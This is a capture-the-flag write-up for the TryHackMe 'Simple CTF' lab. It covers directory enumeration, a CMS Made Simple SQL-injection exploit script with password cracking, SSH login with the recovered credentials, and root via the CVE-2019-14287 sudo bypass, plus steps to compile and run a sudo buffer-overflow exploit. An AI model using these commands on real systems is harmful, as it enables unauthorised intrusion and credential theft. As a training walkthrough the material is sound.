
# Simple CTF — TryHackMe

**By Stager** | FashilHack

---

## What is this machine
Simple CTF is a beginner-friendly Linux box that focuses on **web enumeration, exploiting a CMS vulnerability, and privilege escalation**.

The objective is straightforward:

- Gain initial access through a vulnerable web application
    
- Move from low-privilege user → root
    

This room is great for understanding how **real-world CMS exploits + weak configurations** can lead to full compromise.

---

## Target

```
IP: 10.10.107.13
OS: Linux
```

---

## Step 1 — Web Enumeration

Start by discovering hidden directories.

```bash
dirbuster -u http://10.10.107.13 \
/usr/share/wordlists/wfuzz/webservices/ws-dirs.txt
```

### Result:

- `/simple` ← **important**
    

Navigating to:

```
http://10.10.107.13/simple
```

Reveals a **CMS website**.

---

## Step 2 — Identify CMS & Exploit

After inspecting the page, the CMS is identified as:

👉 **CMS Made Simple**

Search for known exploits → found:

- **CMS Made Simple < 2.2.10 — SQL Injection**
    

Exploit script:

```bash
python 46635.py -u http://10.10.107.13/simple \
--crack \
-w /usr/share/seclists/SecLists-master/Passwords/500-worst-passwords.txt
```

---

### What the exploit does:

- Performs SQL Injection
    
- Extracts username + password hash
    
- Cracks the password using a wordlist
    

### Result:

✔ Credentials obtained (username + password)

---

## Step 3 — SSH Access

Login using discovered credentials:

```bash
ssh mitch@10.10.107.13 -p 2222
```

### Result:

```bash
whoami
# mitch
```

We now have **low-level user access** 🎯

---

## Step 4 — Enumeration as User

Basic checks:

```bash
history
sudo -l
```

Look for:

- Misconfigured sudo permissions
    
- Writable files
    
- Interesting binaries
    

---

## Step 5 — Privilege Escalation (CVE-2019-14287)

This system is vulnerable to:

👉 **CVE-2019-14287 (sudo privilege bypass)**

### Vulnerability:

Sudo does not properly validate user IDs.

Using:

```
-u#-1
```

It maps to:

```
UID 0 → root
```

---

### Exploit:

```bash
sudo -u#-1 /bin/bash
```

### Result:

```bash
whoami
# root
```

🔥 Root access achieved

---

## Full Attack Chain

```
Dirbusting → /simple
  ↓
CMS identification → CMS Made Simple
  ↓
SQL Injection exploit → credentials
  ↓
SSH login → mitch user
  ↓
sudo misconfiguration (CVE-2019-14287)
  ↓
Root shell
```

---

## Alternative Enumeration Tools

You also noted useful tools:

### Dirsearch

```bash
python3 dirsearch.py -u http://<IP> -e php,html -x 400,401,403
```

### Gobuster

```bash
gobuster dir -u http://<IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

---

## Extra Knowledge — Sudo Exploits

### 1. CVE-2019-14287 (Used here)
- Bypass sudo user restriction
- Command:
    
```bash
sudo -u#-1 /bin/bash
```

---
### 2. CVE-2019-18634 (Buffer Overflow)

Another sudo vulnerability (different room):
- Affects sudo < 1.8.26
- Requires `pwfeedback` enabled
Reference:
- CVE-2019-18634
Exploit example:
```bash
scp -P 4444 exploit.c tryhackme@<IP>:/dev/shm
cd /dev/shm
gcc exploit.c -o exploit
./exploit
```

---
## Key Takeaways

**1. Always identify the technology first**  
Knowing it's CMS Made Simple led directly to a working exploit.

**2. Public exploits save time**  
Exploit-DB scripts can turn hours of work into minutes.

**3. Password reuse is common**  
Web creds → SSH access.

**4. Sudo misconfigurations = instant root**  
CVE-2019-14287 is one of the easiest privilege escalations.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._